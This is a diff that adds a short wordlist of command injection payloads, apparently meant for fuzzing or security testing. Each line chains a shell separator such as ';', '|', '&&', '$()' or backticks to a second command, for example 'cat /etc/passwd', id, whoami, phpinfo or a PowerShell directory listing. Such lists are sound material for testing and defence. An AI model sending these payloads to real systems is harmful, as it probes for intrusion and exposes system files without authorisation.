@@ -1,0 +1,14 @@
+;cat /etc/passwd
+;ls -la
+|id
+|whoami
+&&id
+&&whoami
+||id
+||cat /etc/passwd
+$(id)
+`id`
+$((7*7))
+;phpinfo();
+|powershell -NoProfile -Command "Get-ChildItem"
+& ipconfig
